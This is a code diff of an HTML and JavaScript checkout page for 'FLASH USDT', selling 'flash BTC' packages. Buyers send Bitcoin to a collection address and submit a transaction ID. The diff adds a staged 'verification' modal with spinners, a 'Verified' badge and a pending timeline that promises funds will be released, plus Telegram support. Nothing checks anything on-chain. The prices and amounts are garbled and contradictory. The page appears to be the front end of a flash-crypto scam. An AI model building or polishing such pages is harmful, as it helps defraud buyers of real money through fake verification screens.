@@ -28,7 +28,6 @@
     display:flex; flex-direction:column;
   }
 
-  /* Subtle AES background grid */
   .aes-bg{
     position:fixed; inset:0; pointer-events:none; z-index:0; opacity:.08;
     background:
@@ -37,12 +36,10 @@
     mask: radial-gradient(ellipse at 50% 10%, #000 35%, transparent 70%);
   }
 
-  /* Header */
   header{position:sticky;top:0;z-index:50;background:rgba(10,15,40,.75);backdrop-filter:blur(16px);border-bottom:1px solid var(--border)}
   .nav{max-width:1200px;margin:0 auto;padding:14px 20px;display:flex;align-items:center;justify-content:space-between;gap:12px}
   .brand{display:flex;align-items:center;gap:10px;font-weight:800;letter-spacing:.4px}
   .brand img{width:28px;height:28px;border-radius:8px}
-  /* BTC turuncu geçişli yazı */
   .brand span{
     background:linear-gradient(90deg,#ffd08a,#ffaf4d,#ff8c1a);
     -webkit-background-clip:text;background-clip:text;color:transparent
@@ -61,7 +58,6 @@
   .ghost:hover{border-color:#ffd08a}
   .primary{background:linear-gradient(90deg,var(--amber),var(--amber2));border:none;color:#111}
 
-  /* Hero */
   .hero{position:relative; text-align:center; padding:64px 20px 10px; z-index:1}
   .hero h1{
     margin:0 0 8px;
@@ -74,7 +70,6 @@
   .hero p{max-width:880px;margin:8px auto 22px;color:#c5cdf2;line-height:1.7}
   .hero .btn{margin-top:4px}
 
-  /* Main layout */
   main{position:relative;z-index:1; flex:1}
   .wrap{max-width:1200px;margin:0 auto;padding:0 20px}
   .stage{
@@ -86,7 +81,6 @@
   }
   .stage.with-summary{grid-template-columns:minmax(0,1fr) 380px}
 
-  /* Common cards (no rainbow) */
   .card,.panel,.summary{
     position:relative;border-radius:18px;overflow:hidden;
     background:rgba(255,255,255,.045);border:1px solid var(--border);backdrop-filter:blur(14px);
@@ -94,11 +88,9 @@
   }
   .pad{padding:20px}
 
-  /* Section headings */
   .title{margin:0 0 6px;font-size:clamp(24px,3.5vw,28px);text-align:center}
   .sub{color:var(--muted);margin:2px 0 12px;text-align:center}
 
-  /* Products */
   .products{
     max-width:1040px; margin:10px auto 6px;
     display:grid; gap:18px;
@@ -115,7 +107,6 @@
   .chip{display:inline-flex;align-items:center;gap:6px;padding:4px 8px;border-radius:12px;border:1px solid var(--border);background:rgba(255,255,255,.04);font-size:12px;color:#cfd6ff}
   .product .actions{margin-top:12px}
 
-  /* AES tape (aynı, hafif turuncu) */
   .tape{
     position:absolute; left:-40%; right:-40%; top:10px;
     height:22px; display:flex; align-items:center; justify-content:center;
@@ -142,7 +133,6 @@
   .micro{margin-top:10px; display:flex; justify-content:center; gap:10px; flex-wrap:wrap; font-size:11px; color:#cfe0ff}
   .micro span{border:1px solid var(--border);padding:4px 8px;border-radius:999px;background:rgba(255,255,255,.04)}
 
-  /* Fields / methods */
   .field{display:flex;gap:10px;align-items:center;margin-top:12px}
   input[type="text"]{
     flex:1;height:46px;border-radius:12px;border:1px solid var(--border);
@@ -173,10 +163,8 @@
 
   .row{display:flex;justify-content:space-between;gap:10px;color:#cfd6ff;font-size:14px;padding:8px 0;border-bottom:1px dashed rgba(255,255,255,.08)}
   .row:last-child{border-bottom:none}
-  .copy{cursor:pointer;border:1px solid var(--border);border-radius:10px;padding:6px 10px;background:rgba(255,255,255,.04)}
   .small{font-size:12px;color:#aab2d8}
 
-  /* Summary */
   aside{display:none}
   .stage.with-summary aside{display:block; position:sticky; top:88px; height:fit-content}
   .summary .head{display:flex; align-items:center; justify-content:space-between; gap:10px; margin-bottom:8px}
@@ -187,69 +175,178 @@
   .slide-in{animation:slideIn .35s ease both}
   @keyframes slideIn{from{opacity:0;transform:translateX(10px)}to{opacity:1;transform:translateX(0)}}
 
-  /* Footer (TRC20 ile aynı yapı) */
   footer{border-top:1px solid var(--border); background:linear-gradient(180deg,var(--bg2),var(--bg3)); color:#a9b1c6}
   .foot{max-width:1200px;margin:0 auto;padding:22px 20px;display:flex;flex-wrap:wrap;gap:12px;justify-content:space-between;align-items:center}
   .foot-left{display:flex;align-items:center;gap:10px}
   .foot-left img{width:22px;height:22px;border-radius:6px}
 
-  /* AES MODAL */
-  .modal{position:fixed; inset:0; display:none; align-items:center; justify-content:center; background:rgba(3,6,21,.6); backdrop-filter:blur(6px); z-index:60}
-  .modal .box{
-    width:min(520px, 92vw);
-    background:rgba(255,255,255,.06); border:1px solid var(--border); border-radius:16px; padding:20px; color:var(--text);
-    box-shadow:0 20px 80px rgba(0,0,0,.45);
-  }
-  .aes-steps{display:flex; gap:10px; margin:14px 0 8px; flex-wrap:wrap}
-  .aes-step{
-    flex:1; min-width:140px;
-    border:1px dashed rgba(255,255,255,.16); border-radius:10px; padding:10px 12px;
-    display:flex; align-items:center; gap:10px; opacity:.75
-  }
-  .aes-step.active{border-style:solid; opacity:1; box-shadow:0 0 0 1px rgba(255,165,0,.28) inset}
-  .dot{width:10px;height:10px;border-radius:50%; background:#ff9e2b; box-shadow:0 0 12px rgba(255,158,43,.55)}
-  .aes-step.active .dot{background:#16d18a; box-shadow:0 0 12px rgba(22,209,138,.6)}
-  .code-line{
-    font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
-    font-size:12px; color:#b9c6ff; opacity:.88
-  }
-  .modal .ok{display:none; margin-top:12px; text-align:center; font-weight:700; color:#9ef7cb}
+  /* VERIFY MODAL (Process + Pending) */
+  .vmodal{position:fixed; inset:0; display:none; align-items:center; justify-content:center; background:rgba(3,6,21,.6); backdrop-filter:blur(6px); z-index:70}
+  .vbox{width:min(780px, 94vw);background:rgba(255,255,255,.06);border:1px solid var(--border);border-radius:18px;padding:22px;color:#text;box-shadow:0 20px 80px rgba(0,0,0,.5);animation:modalIn .25s ease both}
+  @keyframes modalIn{from{opacity:0; transform:translateY(6px) scale(.99)}to{opacity:1; transform:translateY(0) scale(1)}}
+  .vtitle{margin:0 0 6px; text-align:center; font-size:24px; font-weight:900;background:linear-gradient(90deg,#ffe4b5,#ff9e2b); -webkit-background-clip:text; color:transparent;text-shadow:0 0 16px rgba(255,165,0,.18)}
+  .vsub{color:#c5cdf2; text-align:center; margin:2px 0 12px}
+  .vpanel{border:1px solid var(--border); border-radius:16px; background:rgba(255,255,255,.05); padding:18px}
+  .spinner-ring{width:132px; height:132px; margin:6px auto 12px; border-radius:50%;border:7px solid rgba(255,165,0,.18); border-top-color:#ff9e2b; animation:spin 1.1s linear infinite;box-shadow:0 0 20px rgba(255,165,0,.25)}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .verify-states{display:grid; grid-template-columns:repeat(auto-fit,minmax(170px,1fr)); gap:12px; margin-top:10px}
+  .vstate{border:1px solid var(--border); background:rgba(255,255,255,.03); border-radius:12px; padding:12px; text-align:center}
+  .vicon{font-size:18px; margin-bottom:4px}
+  .vlabel{font-size:12px; color:#cfe0ff}
 
-  /* Responsive */
+  .pendingTop{border:1px solid rgba(255,140,26,.35);background:linear-gradient(180deg, rgba(255,140,26,.10), rgba(255,140,26,.04));border-radius:16px; padding:14px; margin-bottom:10px; text-align:center;animation:fadeSwap .35s ease both}
+  @keyframes fadeSwap{ from{opacity:0; transform:translateY(6px)} to{opacity:1; transform:translateY(0)} }
+  .pendingTitle{margin:0; font-size:22px; font-weight:900; color:#ffb347;text-shadow:0 0 10px rgba(255,165,0,.25)}
+  .pendingSub{color:#ffd9b3; margin:6px 0 0}
+  .addr-box{border:1px solid var(--border);background:rgba(0,0,0,.25);border-radius:12px; padding:12px 14px;font-family:ui-monospace,monospace; color:#ffe4b5; word-break:break-all}
+  .timeline{display:flex; flex-direction:column; gap:14px}
+  .tstep{display:flex; gap:12px}
+  .tbadge{min-width:72px; text-align:center; padding:6px 10px; border-radius:10px; font-weight:800; font-size:11px; background:rgba(255,165,0,.12); color:#ffd9b3; border:1px solid rgba(255,165,0,.25)}
+  .tbadge.dim{background:rgba(255,255,255,.05); color:#bcd0ff; border-color:rgba(255,255,255,.12)}
+  .tcontent{flex:1}
+  .tname{font-weight:700; margin-bottom:4px}
+  .tdesc{font-size:13px; color:#cfe0ff}
+  .tstep.active .tname{color:#ffcf99}
+
+  .like-summary{border:1px solid var(--border); border-radius:18px; background:linear-gradient(180deg, rgba(255,255,255,.045), rgba(255,255,255,.03)); box-shadow:inset 0 0 0 1px rgba(255,255,255,.02)}
+  .pay-steps{margin:0 0 10px;padding-left:22px;color:#d5ddff;font-size:15px;line-height:1.8}
+  .pay-steps li::marker{color:#ffb347;font-weight:700}
+  .pay-address-box{position:relative;display:flex;align-items:center;background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:12px;padding:12px 14px;margin-top:8px;font-family:ui-monospace,monospace;font-size:14px;word-break:break-all}
+  .addr-text{flex:1;color:#ffe4b5;font-weight:600}
+  .copy-btn{background:transparent;border:1px solid var(--border);border-radius:8px;color:#cfe0ff;cursor:pointer;font-size:13px;margin-left:8px;padding:6px 10px}
+  .copy-btn:hover{border-color:#ffd08a}
+  .verified-tag{background:rgba(22,209,138,.15);color:#4efca8;font-weight:700;font-size:11px;border-radius:9px;padding:3px 8px;margin-left:8px;box-shadow:0 0 10px rgba(22,209,138,.35), inset 0 0 0 1px rgba(22,209,138,.4)}
+  .warning-box{margin-top:14px;background:rgba(255,165,0,.08);border:1px solid rgba(255,165,0,.25);border-radius:12px;padding:12px 14px;color:#ffcc80;font-size:14px;line-height:1.6}
+  .time-box{margin-top:10px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.08);border-radius:12px;padding:10px 14px;font-size:14px;color:#bcd0ff}
+
   @media (max-width:960px){
     .stage.with-summary{grid-template-columns:1fr}
     aside{position:relative; top:auto}
   }
+    /* Genel koruma: yatay taşmaları öldür */
+html, body { overflow-x: hidden; }
+@supports (overflow: clip){ html, body { overflow-x: clip; } }
+*, *::before, *::after { min-width: 0; }
+
+/* Görseller ve uzun metinler */
+img { max-width: 100%; height: auto; }
+.addr-text, #pay-address, #pending-txid, .small, .tdesc, .kv span, input[type="text"]{
+  overflow-wrap: anywhere; word-break: break-word;
+}
+
+/* Konteyner ve ana grid */
+.wrap{ max-width:1200px; padding-left:16px; padding-right:16px; }
+.stage{ grid-template-columns: minmax(0,1.55fr) minmax(0,0.95fr); }
+
+/* Header: dar ekranda kırılma */
+.nav{ flex-wrap:wrap; gap:8px; }
+.menu{ flex-wrap:wrap; gap:12px; }
+.menu a{ padding:6px 0; }
+
+/* Kart/panel taşmalarını gizle, güvenli padding */
+.card,.panel,.summary{ overflow:hidden; }
+.pad{ padding:20px; }
+
+/* Ürün ızgarası ve kartlar */
+.products{ grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:16px; }
+.product{ padding:18px; overflow:hidden; }
+/* kayan şerit genişlikleri güvenli */
+.tape{ left:-60%; right:-60%; }
+
+/* Ödeme yöntemleri ızgarası */
+.methods{ grid-template-columns:repeat(auto-fit,minmax(170px,1fr)); gap:12px; }
+
+/* Satır bileşenleri */
+.row{ align-items:center; }
+.row > *{ min-width:0; }
+
+/* Sağ özet: mobilde alta insin */
+aside{ position:static; top:auto; }
+@media (min-width:1101px){ aside{ position:sticky; top:88px; } }
+
+/* Form alanı tam genişlik */
+.field{ gap:8px; }
+input[type="text"]{ width:100%; height:48px; }
+
+/* Footer kırılımı */
+footer .foot{ gap:10px; }
+footer .foot > *{ min-width:0; }
+
+/* Modal güvenli alan */
+.vbox{ width:min(780px,94vw); }
+.vpanel{ padding:14px; }
+
+/* ========= Breakpoints ========= */
+
+/* ≤ 1100px: tek sütun sahne + cüzdan grid */
+@media (max-width:1100px){
+  .stage{ grid-template-columns:1fr; }
+  .wallet-grid{ grid-template-columns:1fr; gap:16px; }
+}
+
+/* ≤ 992px: tipografi ve spacing yumuşat */
+@media (max-width:992px){
+  .hero{ padding:40px 16px 8px; }
+  .hero h1{ font-size:clamp(24px,5.5vw,32px); }
+  .pad{ padding:18px; }
+}
+
+/* ≤ 768px: tüm ızgaralar tek sütun, küçük padding */
+@media (max-width:768px){
+  .products{ grid-template-columns:repeat(auto-fit,minmax(170px,1fr)); gap:12px; }
+  .methods{ grid-template-columns:1fr; }
+  .pi-features{ grid-template-columns:1fr; }
+  .pay-address-box{ padding:10px 12px; }
+  .vtitle,.pendingTitle{ font-size:20px; }
+}
+
+/* ≤ 560px: başlıklar/butonlar küçülsün */
+@media (max-width:560px){
+  .title{ font-size:20px; }
+  .product h4{ font-size:16px; }
+  .price{ font-size:18px; }
+  .btn{ padding:10px 14px; border-radius:12px; }
+  .kv{ font-size:12.5px; }
+  .kv .k{ min-width:96px; }
+  .order-summary .kv{ font-size:12.5px; }
+  .security-badge{ font-size:10px; padding:5px 8px; }
+  .tbadge{ min-width:64px; }
+}
+
+/* ≤ 400px: en dar cihaz için son rötuşlar */
+@media (max-width:400px){
+  .hero p{ font-size:14px; }
+  .mini-feature{ padding:6px 8px; font-size:12px; }
+  .vpanel, .panel, .card{ border-radius:14px; }
+  .pay-address-box{ font-size:13px; }
+}
+
 </style>
 </head>
 <body>
 <div class="aes-bg"></div>
 
-<!-- NAV -->
 <header>
   <div class="nav">
     <div class="brand"><img src="assets/logo.png" alt=""><div><span>FLASH</span> USDT</div></div>
     <nav class="menu">
       <a href="index.html">Home</a>
-      <a href="#steps">Checkout</a>
+      <a href="#steps">Product</a>
       <a href="#verify">TXID</a>
     </nav>
     <a class="btn" id="goStart" href="#steps">Get Started</a>
   </div>
 </header>
 
-<!-- HERO -->
 <section class="hero" id="top">
   <h1>BTC Checkout — AES Secure</h1>
   <p>Select a package, enter your BTC wallet, choose payment, send, and submit your TXID. Fast confirmations, AES-256 security, 24/7 support.</p>
 </section>
 
-<!-- MAIN -->
 <main class="wrap" id="steps">
   <div class="stage" id="stage">
-    <!-- CENTER COLUMN -->
     <section style="width:100%;max-width:1120px">
-      <!-- STEP 1: PRODUCTS (görseldeki ürün ve fiyatlar) -->
+      <!-- STEP 1 -->
       <div class="card pad" id="step1">
         <h2 class="title">Select Your BTC Package</h2>
         <p class="sub">Fast confirmation • On-chain security • AES-256 protected</p>
@@ -260,7 +357,7 @@
             <div class="security-badge">🔒 AES-256 SECURE</div>
             <h4>1K FLASH BTC</h4>
             <div class="price">$40.700,000</div>
-            <div class="amount">Amount: 1,000 USDT</div>
+            <div class="amount">Amount: 1,000 BTC</div>
             <div class="micro"><span>BTC Confirm ~10m*</span><span>SegWit</span><span>Multi-Network Compatible</span></div>
             <div class="actions"><button class="btn primary select">Select</button></div>
             <div class="led-dot"></div>
@@ -271,7 +368,7 @@
             <div class="security-badge">🔒 AES-256 SECURE</div>
             <h4>2K FLASH BTC</h4>
             <div class="price">$90.700,000</div>
-            <div class="amount">Amount: 2,000 USDT</div>
+            <div class="amount">Amount: 2,000 BTC</div>
             <div class="micro"><span>BTC Confirm ~10m*</span><span>SegWit</span><span>Multi-Network Compatible</span></div>
             <div class="actions"><button class="btn primary select">Select</button></div>
             <div class="led-dot"></div>
@@ -282,7 +379,7 @@
             <div class="security-badge">🔒 AES-256 SECURE</div>
             <h4>5K FLASH BTC</h4>
             <div class="price">$230,000.000</div>
-            <div class="amount">Amount: 5,000 USDT</div>
+            <div class="amount">Amount: 5,000 BTC</div>
             <div class="micro"><span>BTC Confirm ~10m*</span><span>SegWit</span><span>Multi-Network Compatible</span></div>
             <div class="actions"><button class="btn primary select">Select</button></div>
             <div class="led-dot"></div>
@@ -293,7 +390,7 @@
             <div class="security-badge">🔒 AES-256 SECURE</div>
             <h4>10K FLASH BTC</h4>
             <div class="price">$63,700.000</div>
-            <div class="amount">Amount: 10,000 USDT</div>
+            <div class="amount">Amount: 10,000 BTC</div>
             <div class="micro"><span>BTC Confirm ~10m*</span><span>SegWit</span><span>Multi-Network Compatible</span></div>
             <div class="actions"><button class="btn primary select">Select</button></div>
             <div class="led-dot"></div>
@@ -301,29 +398,46 @@
         </div>
       </div>
 
-      <!-- STEP 2: WALLET -->
+      <!-- STEP 2 -->
       <div class="card pad" id="step2" style="display:none">
         <h2 class="title">Enter Your BTC Wallet</h2>
         <p class="sub">Enter the recipient <b>Bitcoin</b> wallet (e.g., starts with <b>bc1</b>, <b>1</b> or <b>3</b>) where your package will be delivered.</p>
+
+        <div class="panel pad like-summary" style="margin-top:12px">
+          <h3 style="margin:0 0 10px;">Order Summary</h3>
+          <div class="row" style="align-items:center;gap:14px;">
+            <img src="assets/btc.png" alt="token" style="width:48px;height:48px;border-radius:10px;">
+            <div>
+              <div style="font-weight:800;font-size:18px;" id="sum-name">—</div>
+              <div class="small" style="color:#ffd08a;">BTC Network</div>
+            </div>
+          </div>
+
+          <div class="row"><div class="k">Product</div><div id="sum-prod">—</div></div>
+          <div class="row"><div class="k">Network</div><div id="sum-net">BTC</div></div>
+          <div class="row"><div class="k">Price</div><div id="sum-price" style="color:#ffb347;font-weight:800;">—</div></div>
+        </div>
+
         <div class="panel pad" style="margin-top:12px">
           <div class="field">
             <input type="text" id="wallet" placeholder="Your BTC wallet address (bc1..., 1..., or 3...)" />
           </div>
           <div class="small" style="margin-top:6px">Warning: Sending to a wrong address is irreversible.</div>
         </div>
+
         <div class="actions">
           <button class="btn ghost" data-back>Back</button>
           <button class="btn primary" data-next>Continue</button>
         </div>
       </div>
 
-      <!-- STEP 3: METHOD -->
+      <!-- STEP 3 -->
       <div class="card pad" id="step3" style="display:none">
         <h2 class="title">Select Payment Method</h2>
         <p class="sub">Choose your payment network. Closed methods stay visible for clarity.</p>
 
         <div class="methods">
-          <div class="method panel pad" data-method="BTC">
+          <div class="method panel pad active" data-method="BTC">
             <img src="assets/btc.png" alt=""><div>BTC (Bitcoin)</div>
           </div>
 
@@ -355,43 +469,72 @@
         </div>
       </div>
 
-      <!-- STEP 4: PAYMENT DETAILS -->
+      <!-- STEP 4 -->
       <div class="card pad" id="step4" style="display:none">
-        <h2 class="title">Payment Details</h2>
-        <p class="sub">Send the package amount to the address below using the <b>BTC network</b> only.</p>
+        <h2 class="title">Payment Instructions</h2>
+        <p class="sub">Please follow the steps below to complete your payment securely.</p>
 
-        <div class="panel pad" style="margin-top:12px">
-          <div class="row"><div>Network</div><div id="sum-network">—</div></div>
-          <div class="row">
-            <div>Payment Address</div>
-            <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
-              <span id="pay-address" class="small">—</span>
-              <button class="copy" id="copyAddr">Copy</button>
+        <div class="panel pad like-summary">
+          <!-- Header block -->
+          <div class="row" style="align-items:center;gap:14px; border-bottom:1px dashed rgba(255,255,255,.08); padding-bottom:12px; margin-bottom:6px;">
+            <img src="assets/btc.png" alt="token" style="width:48px;height:48px;border-radius:10px;">
+            <div>
+              <div style="font-weight:800;font-size:18px;" id="pd-name">—</div>
+              <div class="small" style="color:#ffd08a;">BTC Network</div>
             </div>
           </div>
-          <div class="small" style="margin-top:8px">Use the BTC network you selected. Wrong-network transfers are not recoverable.</div>
-        </div>
 
-        <div class="actions">
-          <button class="btn ghost" data-back>Back</button>
-          <button class="btn primary" data-next>I've Made the Payment</button>
+          <!-- Info lines -->
+          <div class="row"><div class="k">Product</div><div id="pd-prod">—</div></div>
+          <div class="row"><div class="k">Network</div><div id="pd-net">BTC</div></div>
+          <div class="row"><div class="k">Price</div><div id="pd-price" style="color:#ffb347;font-weight:800;">—</div></div>
+
+          <!-- Steps -->
+          <ol class="pay-steps" style="margin-top:10px;">
+            <li>Send exactly <b id="sum-amount-text" style="color:#ffb347;">—</b> worth of <b>BTC</b></li>
+            <li>Use the payment address below</li>
+            <li>Click <b>"I've Made the Payment"</b> after sending</li>
+          </ol>
+
+          <!-- Address -->
+          <div class="row" style="display:block;margin-top:8px;">
+            <div class="small" style="font-weight:800;color:#cfe0ff;margin-bottom:6px;">BTC Payment Address:</div>
+            <div class="pay-address-box">
+              <span id="pay-address" class="addr-text">—</span>
+              <span class="verified-tag">Verified</span>
+              <button class="copy-btn" id="copyAddr" title="Copy Address">Copy</button>
+            </div>
+          </div>
+
+          <div class="warning-box">⚠️ <b>Important</b><br>Only send <b>BTC</b> to this address. Sending any other coin or wrong network may result in loss of funds.</div>
+          <div class="time-box">⏱️ Processing time: <b>1–3 confirmations</b> after payment broadcast.</div>
+
+          <div class="actions" style="margin-top:14px;">
+            <button class="btn ghost" data-back>Back</button>
+            <button class="btn primary" data-next>I've Made the Payment</button>
+          </div>
         </div>
       </div>
 
-      <!-- STEP 5: TXID -->
+      <!-- STEP 5 -->
       <div class="card pad" id="step5" style="display:none">
-        <h2 class="title">Submit Your TXID</h2>
-        <p class="sub">After sending, paste your <b>Transaction ID (TXID)</b> from a BTC block explorer.</p>
+        <h2 class="title" id="verify">Submit Your TXID</h2>
+        <p class="sub">After sending, paste your <b>BTC Transaction ID (TXID)</b> from a block explorer.</p>
 
-        <div class="panel pad" style="margin-top:12px">
-          <div class="field">
-            <input type="text" id="txid" placeholder="Paste your BTC TXID here" />
+        <div class="panel pad like-summary" style="margin-top:12px;">
+          <div class="small" style="margin-bottom:12px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:12px;padding:12px 14px;color:#bcd0ff;">
+            🔗 <b>BTC Verification</b> — Your transaction details are securely processed and verified on the Bitcoin network.
           </div>
-          <div class="actions" style="margin-top:12px">
+
+          <label for="txid" class="small" style="font-weight:800;color:#cfe0ff;">Transaction ID (TXID)</label>
+          <div class="field" style="margin-top:8px;">
+            <input type="text" id="txid" placeholder="Paste your BTC TXID (hex hash)" />
+          </div>
+
+          <div class="actions" style="margin-top:16px;">
             <button class="btn ghost" data-back>Back</button>
-            <button class="btn primary" id="sendTxid">Submit Transaction</button>
+            <button class="btn primary" id="sendTxid">🔗 Verify Transaction</button>
           </div>
-          <div class="small" style="margin-top:8px">We do not collect personal data. Only TXID and necessary order info are sent.</div>
         </div>
       </div>
     </section>
@@ -423,35 +566,87 @@
   </div>
 </main>
 
-<!-- FOOTER -->
 <footer>
   <div class="foot">
     <div class="foot-left">
       <img src="assets/USDT-2.png" alt="">
       <strong>FLASH USDT</strong> — Encrypted by AES-256 • Verified on BTC
     </div>
-    <div>Contact: <a style="color:#cfe8ff" href="mailto:support@flashusdt.com">support@flashusdt.com</a></div>
+    <div>Contact: <a style="color:#cfe0ff" href="mailto:support@flashusdt.com">support@flashusdt.com</a></div>
     <div>© <span id="y"></span> FLASH USDT — BTC</div>
   </div>
 </footer>
 
-<!-- AES MODAL -->
-<div class="modal" id="aesModal" aria-hidden="true">
-  <div class="box">
-    <h3 style="margin:0 0 6px">Processing Transaction</h3>
-    <div class="small">AES-256 encryption & chain verification</div>
-
-    <div class="aes-steps" style="margin-top:12px">
-      <div class="aes-step" id="st1"><div class="dot"></div><div><strong>Encrypting</strong><div class="small">Sealing payload</div></div></div>
-      <div class="aes-step" id="st2"><div class="dot"></div><div><strong>Verifying</strong><div class="small">Confirming on-chain</div></div></div>
-      <div class="aes-step" id="st3"><div class="dot"></div><div><strong>Finalizing</strong><div class="small">Writing audit log</div></div></div>
+<!-- VERIFY MODAL (Process + Pending like ERC20) -->
+<div class="vmodal" id="verifyModal" aria-hidden="true">
+  <div class="vbox">
+    <!-- PROCESS -->
+    <div id="vProcess">
+      <h3 class="vtitle">Verify Your Transaction</h3>
+      <p class="vsub">Please wait while we verify your transaction on the Bitcoin network. This process is secure and automated.</p>
+      <div class="vpanel" style="text-align:center;">
+        <div class="spinner-ring"></div>
+        <h3 style="margin:6px 0 6px; text-align:center;">Verifying Transaction</h3>
+        <p class="small" style="text-align:center; color:#cfe0ff;">We are checking your TXID and confirming details on-chain.</p>
+        <div class="verify-states">
+          <div class="vstate"><div class="vicon">🔎</div><div class="vlabel">Searching mempool</div></div>
+          <div class="vstate"><div class="vicon">⏱️</div><div class="vlabel">Waiting confirmations</div></div>
+          <div class="vstate"><div class="vicon">🛡️</div><div class="vlabel">Securing transaction</div></div>
+        </div>
+      </div>
+      <div class="actions" style="display:flex;justify-content:center;margin-top:12px;">
+        <button class="btn ghost" id="vClose1">Close</button>
+      </div>
     </div>
 
-    <div class="code-line" id="codeLine">[AES] init…</div>
-    <div class="ok" id="okMsg">✅ Transaction Submitted. You can close this window.</div>
+    <!-- PENDING -->
+    <div id="vPending" style="display:none;">
+      <div class="pendingTop">
+        <h3 class="pendingTitle">Transaction Verification Pending</h3>
+        <p class="pendingSub">Your TXID is awaiting confirmations. This usually takes 10–30 minutes depending on network conditions.</p>
+      </div>
 
-    <div class="actions" style="margin-top:14px;justify-content:flex-end">
-      <button class="btn ghost" id="closeModal">Close</button>
+      <div class="vpanel" style="margin-bottom:12px;">
+        <div style="color:#ffcf99; font-weight:700; margin-bottom:6px;">⚠️ TXID Confirmation Pending</div>
+        <div class="small">Once confirmed, your order will move to processing and funds will be released to your wallet.</div>
+      </div>
+
+      <div class="vpanel" style="margin-bottom:12px;">
+        <div class="small" style="font-weight:700;color:#cfe0ff;margin-bottom:6px;">Transaction ID:</div>
+        <div class="addr-box" id="pending-txid">—</div>
+      </div>
+
+      <div class="vpanel" style="margin-bottom:12px;">
+        <div style="display:flex; align-items:center; gap:8px; color:#ffb347; font-weight:800; margin-bottom:10px;">⏺️ Verification Process</div>
+        <div class="timeline">
+          <div class="tstep active">
+            <div class="tbadge">STEP 1</div>
+            <div class="tcontent">
+              <div class="tname">TXID Received</div>
+              <div class="tdesc">We’ve received your TXID and are monitoring the mempool and confirmations.</div>
+            </div>
+          </div>
+          <div class="tstep">
+            <div class="tbadge dim">STEP 2</div>
+            <div class="tcontent">
+              <div class="tname">Transaction Processing</div>
+              <div class="tdesc">After first confirmations, payment is processed and prepared for release.</div>
+            </div>
+          </div>
+          <div class="tstep">
+            <div class="tbadge dim">STEP 3</div>
+            <div class="tcontent">
+              <div class="tname">Wallet Transfer</div>
+              <div class="tdesc">Funds are released to your specified wallet. You’ll receive a completion notice.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div style="display:flex;justify-content:space-between;gap:10px;flex-wrap:wrap;">
+        <a class="btn" href="https://t.me/onlyXbtc" target="_blank" rel="noopener">Telegram Support ↗</a>
+        <button class="btn ghost" id="vClose2">Back to Main</button>
+      </div>
     </div>
   </div>
 </div>
@@ -460,9 +655,9 @@
   // Year
   document.getElementById('y').textContent = new Date().getFullYear();
 
-  // CONFIG (BTC aktif, diğerleri kapalı/boş)
+  // CONFIG
   const ADDRS = {
-    BTC: "bc1qexampleaddress0000000000000000000x9",    // <-- kendi BTC alım adresinizi girin
+    BTC: "bc1qexampleaddress0000000000000000000x9",   // TODO: kendi BTC tahsilat adresinizi girin
     TRC20: "", ERC20: "", BEP20: ""
   };
   const EMAILJS = {
@@ -472,7 +667,7 @@
   };
 
   // STATE
-  const state = { productName:null, productUSDT:null, productPrice:null, wallet:null, network:null };
+  const state = { productName:null, productUSDT:null, productPrice:null, wallet:null, network:"BTC", txid:null };
 
   const $ = sel => document.querySelector(sel);
   const stage = $('#stage');
@@ -490,24 +685,56 @@
     if(show){ stage.classList.add('with-summary'); $('#s-time').textContent = new Date().toLocaleString(); }
     else{ stage.classList.remove('with-summary'); }
   }
-  function ADDRRSafe(net){ return ADDRS[net] || '—'; }
+  const ADDRRSafe = (net) => ADDRS[net] || '—';
 
   function updateSummary(){
+    // Right summary
     $('#s-name').textContent   = state.productName || '—';
     $('#s-amount').textContent = state.productUSDT ? `${Number(state.productUSDT).toLocaleString()} USDT` : '—';
     $('#s-price').textContent  = state.productPrice || '—';
     $('#s-wallet').textContent = state.wallet || '—';
     $('#s-network').textContent= state.network || '—';
-    $('#s-address').textContent= state.network ? (ADDRS[state.network] || '—') : '—';
-    const sumN = $('#sum-network'); if(sumN) sumN.textContent = state.network || '—';
-    const payA = $('#pay-address'); if(payA) payA.textContent = state.network ? ADDRRSafe(state.network) : '—';
+    $('#s-address').textContent= state.network ? (ADDRRSafe(state.network) || '—') : '—';
+    $('#s-time').textContent   = new Date().toLocaleString();
+
+    // Step2 summary box
+    $('#sum-name').textContent = state.productName || '—';
+    $('#sum-prod').textContent = state.productUSDT ? `${Number(state.productUSDT).toLocaleString()} FLASH` : '—';
+    $('#sum-net').textContent  = state.network || 'BTC';
+    $('#sum-price').textContent= state.productPrice || '—';
+
+    // Step4 header + fields
+    $('#pd-name').textContent  = state.productName || '—';
+    $('#pd-prod').textContent  = state.productUSDT ? `${Number(state.productUSDT).toLocaleString()} FLASH` : '—';
+    $('#pd-net').textContent   = state.network || 'BTC';
+    $('#pd-price').textContent = state.productPrice || '—';
+
+    // "Send exactly" mirrors price string like ERC20 page
+    $('#sum-amount-text').textContent = state.productPrice || '—';
+
+    // Payment address text
+    const payA = $('#pay-address');
+    if(payA) payA.textContent = state.network ? ADDRRSafe(state.network) : '—';
   }
 
-  // Scroll to start
+  // Verify modal helpers (ERC20'deki gibi)
+  const vModal   = document.getElementById('verifyModal');
+  const vProcess = document.getElementById('vProcess');
+  const vPending = document.getElementById('vPending');
+  const vClose1  = document.getElementById('vClose1');
+  const vClose2  = document.getElementById('vClose2');
+
+  function openVerifyProcess(){ vModal.style.display='flex'; vModal.setAttribute('aria-hidden','false'); vProcess.style.display='block'; vPending.style.display='none'; }
+  function swapToPending(){ vProcess.style.display='none'; vPending.style.display='block'; }
+  function closeVerifyModal(){ vModal.style.display='none'; vModal.setAttribute('aria-hidden','true'); }
+  vClose1?.addEventListener('click', closeVerifyModal);
+  vClose2?.addEventListener('click', ()=>{ closeVerifyModal(); showStep('step1'); toggleSummary(false); });
+
+  // Start button
   const gotoStart = () => { showStep('step1'); document.getElementById('steps').scrollIntoView({behavior:'smooth'}); };
   $('#goStart')?.addEventListener('click', e=>{ e.preventDefault(); gotoStart(); });
 
-  // Copy
+  // Copy pay address
   $('#copyAddr')?.addEventListener('click', ()=>{
     const txt = ($('#pay-address')?.textContent||'').trim();
